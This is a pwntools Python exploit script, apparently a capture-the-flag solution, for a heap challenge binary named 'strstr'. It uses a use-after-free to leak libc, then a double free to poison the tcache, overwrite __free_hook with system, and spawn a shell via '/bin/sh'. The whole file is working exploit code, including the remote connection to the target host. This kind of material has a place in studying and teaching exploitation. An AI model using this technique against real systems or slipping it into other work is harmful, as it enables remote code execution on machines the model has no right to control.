#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./strstr"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def store(idx: int, buf):
    p.sendlineafter('command:', '0')
    p.sendlineafter('index:', str(idx))
    p.sendlineafter('string:', buf)

def show(idx: int):
    p.sendlineafter('command:', '1')
    p.sendlineafter('index:', str(idx))
    p.recvuntil(b'\x20')
    return p.recvline().rstrip(b'\n')

def delete(idx: int):
    p.sendlineafter('command:', '2')
    p.sendlineafter('index:', str(idx))


# fill tcache & send last one to unsorted_bin
for i in range(8):
    store(i, b'A' * 0x90)

# stop merge into top
store(8, b'B' * 0x10)

for i in range(8):
    delete(i)

# leak main_arena address
leak = u64(show(7) + b'\0' * 2)
log.info("leak: " + hex(leak))
offset = 0x3ebca0
libc_base = leak - offset
log.info("libc base: " + hex(libc_base))

free_hook_addr = libc_base + libc.symbols['__free_hook']
log.info("__free_hook: " + hex(free_hook_addr))
system_libc_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_libc_addr))


# double free
delete(8)
delete(8)
store(8, p64(free_hook_addr))

# overwrite __free_hook
store(9, p64(0xdeadbeef))
store(10, p64(system_libc_addr))
store(0, '/bin/sh')
delete(0)

p.interactive()
